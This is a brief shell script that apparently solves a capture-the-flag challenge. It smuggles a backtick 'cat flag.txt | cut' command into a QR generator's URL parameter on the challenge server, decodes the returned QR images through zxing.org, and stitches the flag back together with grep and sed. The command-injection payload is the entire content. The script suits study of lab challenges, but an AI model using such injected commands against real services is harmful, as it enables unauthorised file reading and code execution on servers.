#wget -c http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text=%60cat%20flag.txt%20%7C%20cut%20-c%20{1..20}%60
wget -qc https://zxing.org/w/decode?u=http%3A%2F%2Fchalls.houseplant.riceteacatpanda.wtf%3A30004%2Fqr%3Ftext%3D%2560cat%2520flag.txt%2520%257C%2520cut%2520-c%2520{1..34}%2560
ls -rct decode\?u* | xargs cat | grep -o "Raw text[a-zA-Z0-9<>/_{}?]*<" | sed 's/Raw text<\/td><td><pre>//g' | sed 's/<\/pre><\/td><\/tr><tr><//g' | rev | cut -c 1- | rev | tr -d '\n'
